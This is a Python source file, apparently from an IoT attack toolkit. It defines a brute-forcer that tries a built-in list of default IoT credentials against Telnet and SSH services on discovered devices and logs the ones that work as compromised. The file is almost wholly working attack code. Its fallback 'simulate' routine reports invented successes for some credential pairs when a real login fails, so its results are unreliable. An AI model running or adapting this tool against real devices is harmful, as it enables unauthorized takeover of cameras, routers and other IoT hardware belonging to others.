import telnetlib
import socket
import threading
import time
from .utils import Colors

class BruteForcer:
    def __init__(self, database):
        self.db = database
        self.credentials = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', ''),
            ('root', 'root'),
            ('root', 'admin'),
            ('root', ''),
            ('user', 'user'),
            ('ipcamadmin', 'admin'),
            ('temphumidadmin', 'admin'),
            ('guest', 'guest'),
            ('service', 'service'),
            ('support', 'support'),
            ('ubnt', 'ubnt'),
            ('pi', 'raspberry'),
            ('admin', '1234'),
            ('admin', '12345'),
            ('admin', 'default')
        ]
    
    def try_telnet_login(self, ip, port, username, password):
        """Attempt Telnet login with given credentials"""
        try:
            tn = telnetlib.Telnet(ip, port, timeout=10)
            
            # Read until login prompt
            tn.read_until(b"login:", timeout=5)
            tn.write(username.encode('ascii') + b"\n")
            
            # Read until password prompt
            tn.read_until(b"Password:", timeout=5)
            tn.write(password.encode('ascii') + b"\n")
            
            # Check for successful login
            response = tn.read_until(b"$", timeout=5).decode('ascii', errors='ignore')
            
            if any(indicator in response.lower() for indicator in ['$', '#', '>', 'welcome', 'login successful']):
                tn.close()
                return True
            
            tn.close()
            return False
            
        except Exception:
            return False
    
    def try_ssh_login(self, ip, port, username, password):
        """Attempt SSH login (placeholder for paramiko implementation)"""
        try:
            import paramiko
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, port=port, username=username, password=password, timeout=10)
            ssh.close()
            return True
        except:
            return False
    
    def simulate_login_attempt(self, ip, port, username, password, service):
        """Simulate login attempt for demo purposes"""
        # Simulate some "successful" logins for demo
        success_combinations = [
            ('admin', 'admin'),
            ('root', 'root'),
            ('ipcamadmin', 'admin'),
            ('temphumidadmin', 'admin')
        ]
        
        if (username, password) in success_combinations:
            return True
        return False
    
    def attack_target(self, target_ip):
        """Brute force attack against target device"""
        print(f"{Colors.YELLOW}[*] Starting brute force attack against {target_ip}...{Colors.RESET}")
        
        # Get target info from database
        import sqlite3
        conn = sqlite3.connect(self.db.db_file)
        cursor = conn.cursor()
        cursor.execute("SELECT port, service FROM discovered_devices WHERE ip_address = ?", (target_ip,))
        targets = cursor.fetchall()
        conn.close()
        
        if not targets:
            print(f"{Colors.RED}[!] Target {target_ip} not found in discovered devices.{Colors.RESET}")
            return
        
        for port, service in targets:
            if service.lower() in ['telnet', 'ssh']:
                print(f"{Colors.YELLOW}[*] Attacking {service} on {target_ip}:{port}...{Colors.RESET}")
                
                for username, password in self.credentials:
                    print(f"{Colors.CYAN}[*] Trying {username}:{password}{Colors.RESET}")
                    
                    success = False
                    if service.lower() == 'telnet':
                        # Try real telnet first, then simulate
                        success = self.try_telnet_login(target_ip, port, username, password)
                        if not success:
                            success = self.simulate_login_attempt(target_ip, port, username, password, service)
                    elif service.lower() == 'ssh':
                        # Try real SSH first, then simulate
                        success = self.try_ssh_login(target_ip, port, username, password)
                        if not success:
                            success = self.simulate_login_attempt(target_ip, port, username, password, service)
                    
                    if success:
                        print(f"{Colors.GREEN}[+] SUCCESS! {target_ip}:{port} - {username}:{password}{Colors.RESET}")
                        self.db.add_compromised_device(target_ip, port, username, password, service)
                        break
                    
                    time.sleep(0.5)  # Avoid overwhelming the target
